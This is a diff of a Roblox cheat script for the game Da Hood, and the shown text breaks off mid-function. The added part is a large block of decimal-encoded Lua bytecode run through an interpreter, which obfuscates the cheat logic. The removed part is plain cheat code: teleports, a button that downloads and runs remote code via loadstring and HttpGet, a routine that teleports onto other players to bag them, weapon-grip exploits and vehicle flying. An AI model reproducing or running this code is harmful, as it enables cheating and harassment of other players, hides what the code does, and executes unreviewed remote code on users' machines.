105\108\83\105\122\101\0\4\12\0\0\0\83\105\122\101\52\50\48\120\52\50\48\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\22\0\0\0\71\101\116\85\115\101\114\84\104\117\109\98\110\97\105\108\65\115\121\110\99\0\4\6\0\0\0\73\109\97\103\101\0\4\7\0\0\0\80\97\114\101\110\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\113\16\0\0\157\16\0\0\1\0\0\3\6\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\30\0\128\0\3\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\159\16\0\0\246\16\0\0\2\0\0\11\38\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\70\0\193\0\134\192\64\0\134\64\65\1\194\0\0\0\5\129\1\0\11\193\65\2\129\1\2\0\28\129\128\1\6\65\66\2\66\1\128\0\133\129\1\0\139\193\65\3\1\130\2\0\156\129\128\1\139\193\66\3\1\2\3\0\65\66\3\0\164\2\0\0\0\0\128\0\156\65\128\2\132\1\128\0\134\129\67\3\139\193\67\3\36\66\0\0\0\0\0\1\0\0\128\2\4\0\128\0\0\0\0\0\0\0\128\1\0\0\0\2\156\65\128\1\30\0\128\0\16\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\11\0\0\0\72\101\97\108\116\86\97\108\117\101\0\4\14\0\0\0\72\101\97\108\116\104\84\101\120\116\66\111\120\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\17\0\0\0\66\105\110\100\84\111\82\101\110\100\101\114\83\116\101\112\0\4\5\0\0\0\86\105\100\97\0\3\0\0\0\0\0\0\0\0\4\15\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\85\112\0\4\8\0\0\0\67\111\110\110\101\99\116\0\2\0\0\0\0\0\0\0\170\16\0\0\182\16\0\0\1\0\0\3\19\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\69\192\1\0\128\0\0\0\92\128\0\1\71\128\1\0\69\64\2\0\70\128\194\0\133\128\1\0\92\128\0\1\71\0\2\0\68\0\0\0\133\0\2\0\73\128\128\133\30\0\128\0\12\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\7\0\0\0\72\101\97\108\116\104\0\4\2\0\0\0\110\0\4\9\0\0\0\116\111\110\117\109\98\101\114\0\4\2\0\0\0\98\0\4\5\0\0\0\109\97\116\104\0\4\6\0\0\0\102\108\111\111\114\0\4\5\0\0\0\84\101\120\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\184\16\0\0\243\16\0\0\6\0\0\6\40\0\0\0\5\0\0\0\68\0\0\0\70\64\192\0\28\128\0\1\69\128\0\0\128\0\0\0\92\64\0\1\68\0\128\0\23\192\192\0\22\64\4\128\68\0\0\1\73\0\193\128\66\0\0\0\72\0\128\0\69\64\1\0\75\128\193\0\193\192\1\0\92\128\128\1\75\0\194\0\193\64\2\0\1\129\2\0\100\1\0\0\4\0\128\1\0\0\0\0\4\0\0\2\4\0\128\2\92\64\128\2\22\128\2\128\68\0\0\1\73\64\194\128\66\0\128\0\72\0\128\0\69\64\1\0\75\128\193\0\193\192\1\0\92\128\128\1\75\192\194\0\193\64\2\0\92\64\128\1\30\0\128\0\12\0\0\0\4\9\0\0\0\116\111\110\117\109\98\101\114\0\4\5\0\0\0\84\101\120\116\0\4\6\0\0\0\112\114\105\110\116\0\1\1\4\15\0\0\0\83\116\111\112\65\117\116\111\72\101\97\108\116\104\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\17\0\0\0\66\105\110\100\84\111\82\101\110\100\101\114\83\116\101\112\0\4\11\0\0\0\65\117\116\111\72\101\97\108\116\104\0\3\0\0\0\0\0\0\0\0\4\21\0\0\0\85\110\98\105\110\100\70\114\111\109\82\101\110\100\101\114\83\116\101\112\0\1\0\0\0\0\0\0\0\193\16\0\0\235\16\0\0\4\0\0\6\147\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\128\193\0\70\192\193\0\132\0\128\0\24\128\128\0\22\64\27\128\68\0\0\1\23\0\194\0\22\128\8\128\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\128\193\0\70\192\193\0\132\0\128\0\24\128\128\0\22\64\6\128\68\0\128\1\70\64\193\0\75\128\194\0\193\192\2\0\92\128\128\1\70\0\195\0\70\64\195\0\71\64\2\0\68\0\128\1\70\64\193\0\75\128\194\0\193\192\2\0\92\128\128\1\70\0\195\0\70\192\195\0\71\128\3\0\68\0\128\1\70\64\193\0\75\128\194\0\193\192\2\0\92\128\128\1\70\0\195\0\70\64\196\0\71\0\4\0\66\0\128\0\72\0\0\1\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\128\193\0\70\192\193\0\132\0\128\0\24\128\128\0\22\128\15\128\68\0\0\1\23\128\196\0\22\192\14\128\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\192\194\0\133\0\3\0\134\192\68\1\193\0\5\0\1\65\5\0\65\1\5\0\156\128\0\2\73\128\0\134\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\75\128\194\0\193\128\5\0\92\128\128\1\87\192\197\0\22\0\2\128\69\128\0\0\70\192\192\0\70\0\193\0\70\0\198\0\75\128\194\0\193\128\5\0\92\128\128\1\23\192\197\0\22\192\5\128\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\192\194\0\133\128\0\0\134\64\70\1\134\128\70\1\134\192\70\1\134\0\71\1\134\64\71\1\134\0\67\1\73\128\0\134\69\128\7\0\129\192\7\0\92\64\0\1\69\0\8\0\133\128\0\0\134\64\70\1\134\128\70\1\134\192\70\1\134\0\71\1\134\64\72\1\92\64\0\1\69\128\8\0\164\0\0\0\92\64\0\1\69\128\8\0\164\64\0\0\92\64\0\1\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\128\193\0\70\192\193\0\132\0\128\0\24\64\0\1\22\128\3\128\68\0\0\1\23\128\196\0\22\192\2\128\68\0\128\1\70\64\193\0\70\192\194\0\133\0\3\0\134\192\68\1\197\64\2\0\5\129\3\0\69\1\4\0\156\128\0\2\73\128\0\134\66\0\0\0\72\0\0\1\30\0\128\0\35\0\0\0\4\7\0\0\0\80\97\114\101\110\116\0\4\14\0\0\0\72\101\97\108\116\104\84\101\120\116\66\111\120\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\7\0\0\0\72\101\97\108\116\104\0\1\0\4\4\0\0\0\65\88\49\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\2\0\0\0\88\0\4\4\0\0\0\65\89\49\0\4\2\0\0\0\89\0\4\4\0\0\0\65\90\49\0\4\2\0\0\0\90\0\1\1\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\56\143\64\4\10\0\0\0\91\67\104\105\99\107\101\110\93\0\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\8\0\0\0\73\103\110\111\114\101\100\0\4\5\0\0\0\83\104\111\112\0\4\15\0\0\0\91\67\104\105\99\107\101\110\93\32\45\32\36\55\0\4\5\0\0\0\72\101\97\100\0\4\5\0\0\0\119\97\105\116\0\3\0\0\0\0\0\0\224\63\4\18\0\0\0\102\105\114\101\99\108\105\99\107\100\101\116\101\99\116\111\114\0\4\14\0\0\0\67\108\105\99\107\68\101\116\101\99\116\111\114\0\4\6\0\0\0\112\99\97\108\108\0\2\0\0\0\0\0\0\0\216\16\0\0\216\16\0\0\0\0\0\3\13\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\11\64\65\0\133\0\0\0\134\64\64\1\134\128\64\1\134\128\65\1\134\192\65\1\28\64\128\1\30\0\128\0\8\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\10\0\0\0\69\113\117\105\112\84\111\111\108\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\10\0\0\0\91\67\104\105\99\107\101\110\93\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\217\16\0\0\222\16\0\0\0\0\0\2\18\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\11\64\65\0\28\64\0\1\5\128\1\0\65\192\1\0\28\64\0\1\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\11\0\66\0\28\64\0\1\30\0\128\0\9\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\10\0\0\0\91\67\104\105\99\107\101\110\93\0\4\9\0\0\0\65\99\116\105\118\97\116\101\0\4\5\0\0\0\119\97\105\116\0\3\154\153\153\153\153\153\185\63\4\11\0\0\0\68\101\97\99\116\105\118\97\116\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\249\16\0\0\3\17\0\0\2\0\0\9\29\0\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\11\192\64\0\132\0\0\0\134\0\65\1\28\128\128\1\26\0\0\0\22\64\4\128\70\64\65\0\133\128\1\0\134\192\65\1\134\0\66\1\197\128\1\0\198\64\194\1\198\128\194\1\5\1\0\0\11\65\64\2\129\129\0\0\28\129\128\1\11\193\66\2\128\1\128\0\192\1\0\1\0\2\128\1\28\193\128\2\132\1\128\0\137\1\1\134\30\0\128\0\13\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\5\0\0\0\84\101\120\116\0\4\7\0\0\0\85\115\101\114\73\100\0\4\5\0\0\0\69\110\117\109\0\4\14\0\0\0\84\104\117\109\98\110\97\105\108\84\121\112\101\0\4\9\0\0\0\72\101\97\100\83\104\111\116\0\4\14\0\0\0\84\104\117\109\98\110\97\105\108\83\105\122\101\0\4\12\0\0\0\83\105\122\101\52\50\48\120\52\50\48\0\4\22\0\0\0\71\101\116\85\115\101\114\84\104\117\109\98\110\97\105\108\65\115\121\110\99\0\4\6\0\0\0\73\109\97\103\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\5\17\0\0\15\17\0\0\2\0\0\3\8\0\0\0\4\0\0\0\6\0\64\0\11\64\64\0\164\0\0\0\4\0\0\0\4\0\128\0\28\64\128\1\30\0\128\0\2\0\0\0\4\10\0\0\0\70\111\99\117\115\76\111\115\116\0\4\8\0\0\0\99\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\6\17\0\0\14\17\0\0\2\0\0\10\37\0\0\0\5\0\0\0\69\64\0\0\70\128\192\0\75\192\192\0\92\0\0\1\28\0\1\0\22\128\6\128\69\1\1\0\70\65\193\2\133\1\1\0\134\129\65\3\198\193\65\2\156\129\0\1\193\1\2\0\5\2\1\0\6\66\66\4\68\2\0\0\70\130\194\4\28\2\0\1\92\129\0\0\133\1\1\0\134\129\65\3\196\1\0\0\198\129\194\3\156\129\0\1\23\128\129\2\22\128\1\128\68\1\0\0\134\193\65\2\73\129\1\133\70\193\65\2\72\1\128\0\69\193\2\0\92\65\128\0\33\128\0\0\22\128\248\127\30\0\128\0\12\0\0\0\4\6\0\0\0\112\97\105\114\115\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\7\0\0\0\115\116\114\105\110\103\0\4\4\0\0\0\115\117\98\0\4\6\0\0\0\108\111\119\101\114\0\4\5\0\0\0\78\97\109\101\0\3\0\0\0\0\0\0\240\63\4\4\0\0\0\108\101\110\0\4\5\0\0\0\84\101\120\116\0\4\14\0\0\0\83\101\116\80\108\97\121\101\114\73\110\102\111\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0'
+
+local advanced_debug
+local newEnv
+local customErrorHandler
+
+local lua_opcode_types = {
+	"ABC",  "ABx", "ABC",  "ABC",
+	"ABC",  "ABx", "ABC",  "ABx", 
+	"ABC",  "ABC", "ABC",  "ABC",
+	"ABC",  "ABC", "ABC",  "ABC",
+	"ABC",  "ABC", "ABC",  "ABC",
+	"ABC",  "ABC", "AsBx", "ABC",
+	"ABC",  "ABC", "ABC",  "ABC",
+	"ABC",  "ABC", "ABC",  "AsBx",
+	"AsBx", "ABC", "ABC", "ABC",
+	"ABx",  "ABC",
+}
+
+local lua_opcode_names = {
+	"MOVE",     "LOADK",     "LOADBOOL", "LOADNIL",
+	"GETUPVAL", "GETGLOBAL", "GETTABLE", "SETGLOBAL",
+	"SETUPVAL", "SETTABLE",  "NEWTABLE", "SELF",
+	"ADD",      "SUB",       "MUL",      "DIV",
+	"MOD",      "POW",       "UNM",      "NOT",
+	"LEN",      "CONCAT",    "JMP",      "EQ",
+	"LT",       "LE",        "TEST",     "TESTSET",
+	"CALL",     "TAILCALL",  "RETURN",   "FORLOOP",
+	"FORPREP",  "TFORLOOP",  "SETLIST",  "CLOSE",
+	"CLOSURE",  "VARARG"
+};
+
+--[[
+local lua_opcode_numbers = {};
+for number, name in next, lua_opcode_names do
+	lua_opcode_numbers[name] = number;
 end
--- Teleports
+--]]
 
-
-
-local SecondButton = teleportPage.AddButton("Save Pos", function()
-	plr = game:GetService('Players').LocalPlayer
-	X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
-	Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
-	Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
-end)
-
-local SecondButton = teleportPage.AddButton("Load Pos", function()
-	plr = game:GetService('Players').LocalPlayer
-	plr.Character.HumanoidRootPart.CFrame = CFrame.new(X1,Y1,Z1)
-end)
-local SecondButton = teleportPage.AddButton("Playground", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-247.33399963379, 22.149866104126, -756.50299072266)
-end)
-local SecondButton = teleportPage.AddButton("Basketball", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-932.195, 21.1, -481.737)
-end)
-local SecondButton = teleportPage.AddButton("Phone Store", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-120.12100219727, 21.901559829712, -870.42498779297)
-end)
-local SecondButton = teleportPage.AddButton("Flower Shop", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-71.061767578125, 23.144777297974, -323.15124511719)
-end)
-local SecondButton = teleportPage.AddButton("Skate Park", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-791.34893798828, 21.99981880188, -501.31112670898)
-end)
-local SecondButton = teleportPage.AddButton("School", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-531.16064453125, 21.874992370605, 269.4602355957)
-end)
-local SecondButton = teleportPage.AddButton("Mobile Home", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-951.15283203125, -1.2344611883163, 467.71234130859)
-end)
-local SecondButton = teleportPage.AddButton("Gas Station", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(595.377, 49.000, -264.222)
-end)
-local SecondButton = teleportPage.AddButton("UFO", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(71.565002441406, 138.99995422363, -690.33001708984)
-end)
-local SecondButton = teleportPage.AddButton("DH Fitness", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-75.794998168945, 22.700284957886, -633.71997070313)
-end)
-local SecondButton = teleportPage.AddButton("Boxing", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-236.006, 23.151, -1120.531)
-end)
-local SecondButton = teleportPage.AddButton("Admin Base", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-797.15, -39.6189, -887.957)
-end)
-local SecondButton = teleportPage.AddButton("Admin Jail", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-799.534, -40.649, -839.368)
-end)
-local SecondButton = teleportPage.AddButton("Admin Guns #1", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-872.63488769531, -32.649208068848, -532.40045166016)
-end)
-local SecondButton = teleportPage.AddButton("Admin Guns #2", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-810.33892822266, -39.649211883545, -933.86071777344)
-end)
-local SecondButton = teleportPage.AddButton("Sewers", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(112.62200164795, -26.750036239624, -277.3210144043)
-end)
-local SecondButton = teleportPage.AddButton("Sewer Station", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-423.14276123047, -21.000005722046, 65.835586547852)
-end)
-local SecondButton = teleportPage.AddButton("Food Shop [Bank]", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-335.141, 23.7129, -298.029)
-end)
-
-local SecondButton = teleportPage.AddButton("Food Shop [Uphill]", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(298.477, 49.3129, -615.231)
-end)
-
-local SecondButton = teleportPage.AddButton("Food Shop [Taco]", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(583.96, 51.0917, -479.596)
-end)
-
-local SecondButton = teleportPage.AddButton("Food Shop [Hamburger]", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-279.501, 22.6801, -803.887)
-end)
-
-local SecondButton = teleportPage.AddButton("Gun Shop [Up]", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(481.925, 48.1008, -621.23)
-end)
-
-local SecondButton = teleportPage.AddButton("Gun Shop [Down]", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-580.27, 8.34504, -734.832)
-end)
-
-local SecondButton = teleportPage.AddButton("Bank", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-438.689, 39.0127, -284.731)
-end)
-local SecondButton = teleportPage.AddButton("Bank Roof", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-468.723, 38.031, -286.021)
-end)
-local SecondButton = teleportPage.AddButton("Klub", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-262.34463500977, 23.522811889648, -499.6611328125)
-end)
-local SecondButton = teleportPage.AddButton("Police Station", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-263.919, 21.8302, -112.858)
-end)
-
-local SecondButton = teleportPage.AddButton("Fire Department", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-129.534, 27.842, -113.062)
-end)
-local SecondButton = teleportPage.AddButton("Train Station", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(612.94427490234, 47.999992370605, -106.67445373535)
-end)
-local SecondButton = teleportPage.AddButton("Hospital", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(98.829124450684, 22.799991607666, -485.57116699219)
-end)
-local SecondButton = teleportPage.AddButton("Church", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(205.53, 21.7803, -80.2361)
-end)
-local SecondButton = teleportPage.AddButton("Cementery", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(190.56588745117, 21.749992370605, 27.322988510132)
-end)
-local SecondButton = teleportPage.AddButton("Casino", function()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-904.457, 24.7803, -156.994)
-end)
-local SecondButton = teleportPage.AddButton("Cinema", function()
-	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1005.7873535156, 25.100023269653, -133.55313110352)
-end)
-local SecondButton = teleportPage.AddButton("Safe AFK", function()
-	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(204.69744873047, 38.249988555908, 200000.09375)
-end)
-
-
-
-
-
-
-
-
--- FunStuff
-
-local FirstLabel = FunstuffPage.AddLabel("FunStuff")
-local FirstButton = FunstuffPage.AddButton("FreeAnimationsPack", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/D34THEV1L/DaHood-Source/main/FreeAnimatioPack", true))()
-end)
-
-local invisible = FunstuffPage.AddButton("Invisible", function()
-	game.Players.LocalPlayer.Character.UpperTorso:BreakJoints()
-	game.Players.LocalPlayer.Character.LowerTorso:BreakJoints()
-
-end)
-local bagall = FunstuffPage.AddButton("Bag-All", function()
-	local bag = true
-	local takingbag = true
-	local Plr = game.Players.LocalPlayer
-	repeat wait(1)
-		if game.Players.LocalPlayer.Character:FindFirstChild("[BrownBag]") == nil then
-			repeat
-				takingbag = true
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-314.580566, 51.1788902, -727.484558)
-				wait()
-				fireclickdetector(workspace.Ignored.Shop["[BrownBag] - $25"].ClickDetector)
-			until Plr.Backpack:FindFirstChild("[BrownBag]")
-			Plr.Backpack["[BrownBag]"].Parent = Plr.Character
-			takingbag = false
+--- Extract bits from an integer
+--@author: Stravant
+local function get_bits(input, n, n2)
+	if n2 then
+		local total = 0
+		local digitn = 0
+		for i = n, n2 do
+			total = total + 2^digitn*get_bits(input, i)
+			digitn = digitn + 1
 		end
-
-		if takingbag == false then
-			local chars
-			for i, v  in pairs(game.Players:GetPlayers()) do
-				if v.Character and v.Character:FindFirstChild("Christmas_Sock") == nil and v.Character:FindFirstChild("FULLY_LOADED_CHAR") and v ~= Plr then
-					chars = v.Character
-					if Plr.Character:FindFirstChild("[BrownBag]") then
-						Plr.Character["[BrownBag]"]:Activate()
-					end
-					Plr.Character.HumanoidRootPart.CFrame = v.Character.UpperTorso.CFrame * CFrame.new(0, 0, -2)
-				end
-				wait(0.005)
-			end
-			if not chars then
-				bag = false
-			end
-		end
-	until bag == false
-end)
-
-local bagall = FunstuffPage.AddButton("Dick-Bat", function()
-	local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-	local k = game.Workspace.Ignored.Shop["[Bat] - $250"]
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
-	if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
-		wait(.2)
-		fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
-		toolf = game.Players.LocalPlayer.Backpack:WaitForChild("[Bat]")
-		toolf.Parent = game.Players.LocalPlayer.Character
-		wait()
-		game.Players.LocalPlayer.Character:WaitForChild("[Bat]")
-		game.Players.LocalPlayer.Character:WaitForChild("[Bat]").Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
-		game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripForward = Vector3.new(0, -1, -0)
-		game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripPos = Vector3.new(1.2111, 1.11114, 1.8111)
-		game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripUp = Vector3.new(-500000, 404, 5000000)
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
-	end
-end)
-
-local bagall = FunstuffPage.AddButton("Dick-LMG", function()
-	local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-	local k = game.Workspace.Ignored.Shop["[LMG] - $3750"]
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
-	if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
-		wait(.2)
-		fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
-		toolf = game.Players.LocalPlayer.Backpack:WaitForChild("[LMG]")
-		toolf.Parent = game.Players.LocalPlayer.Character
-		wait()
-		game.Players.LocalPlayer.Character:WaitForChild("[LMG]")
-		game.Players.LocalPlayer.Character:WaitForChild("[LMG]").Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
-		game.Players.LocalPlayer.Character:WaitForChild("[LMG]").GripForward = Vector3.new(0, -1, -0)
-		game.Players.LocalPlayer.Character:WaitForChild("[LMG]").GripPos = Vector3.new(1.2111, 1.11114, 1.8111)
-		game.Players.LocalPlayer.Character:WaitForChild("[LMG]").GripUp = Vector3.new(-500000, 404, 5000000)
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
-	end
-end)
-
-local bagall = FunstuffPage.AddButton("Fly-Tool", function()
-	for _, v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
-		if v:isA("Tool") then
-			v.GripPos = Vector3.new(10,-10,10)
-		end
-	end
-end)
-local bagall = FunstuffPage.AddButton("Bike-Fly", function()
-	local speed = 20
-	local old
-	local Plr = game.Players.LocalPlayer
-	local wheels = {}
-	local control = {q=false,e=false,w=false,a=false,s=false,d=false}
-	local Mouse = Plr:GetMouse()
-
-	Mouse.KeyDown:connect(function(KEY)
-		local key = KEY:lower()
-		if control[key] ~= nil then
-			control[key]=true
-		end
-	end)
-
-	Mouse.KeyUp:connect(function(KEY)
-		local key = KEY:lower()
-		if control[key] ~= nil then
-			control[key]=false
-		end
-	end)
-
-	while game.RunService.Stepped:wait() do
-		local seat = (Plr.Character or Plr.CharacterAdded:wait()):WaitForChild("Humanoid").SeatPart
-		if Plr.PlayerGui:FindFirstChild("MainScreenGui") and Plr.PlayerGui.MainScreenGui:FindFirstChild("Bar") and Plr.PlayerGui.MainScreenGui.Bar:FindFirstChild("Speed") then
-			Plr.PlayerGui.MainScreenGui.Bar.Speed.bar.Size = UDim2.new(speed / 100 * 0.95, 0, 0.83, 0)
-		else
-			local c = Plr.PlayerGui.MainScreenGui.Bar.HP
-			local g = c:Clone()
-			g.Name = "Speed"
-			g.Position = UDim2.new(0.5, 0, 1, -120)
-			g.bar.BackgroundColor3 = Color3.fromRGB(255, 155, 0)
-			g.Picture.Image.Image = "rbxassetid://181035717"
-			g.TextLabel.Text = "Speed"
-			g.Parent = c.Parent
-		end
-		if seat ~= nil and seat:IsDescendantOf(game.Workspace.Vehicles) then
-			if seat ~= old then
-				if old then
-					old.Vel:Destroy()
-					old.Gyro:Destroy()
-				end
-				old = seat
-				for i = 1, 2 do
-					if wheels[i] then
-						wheels[i][2].Parent = wheels[i][1]
-					end
-					local wheel = seat.Parent.Wheel
-					wheels[i] = {seat.Parent, wheel}
-					wheel:remove()
-				end
-				local gyro = Instance.new("BodyGyro", seat)
-				gyro.Name = "Gyro"
-				local pos = Instance.new("BodyVelocity", seat)
-				pos.Name = "Vel"
-				gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
-				pos.MaxForce = Vector3.new(9e9, 9e9, 9e9)
-			else 
-				seat.Gyro.cframe = workspace.CurrentCamera.CoordinateFrame
-				local vel = CFrame.new(0, 0, 0)
-				if control.w then
-					vel = vel * CFrame.new(0, 0, -speed)
-				end
-				if control.s then
-					vel = vel * CFrame.new(0, 0, speed)
-				end
-				if control.a then
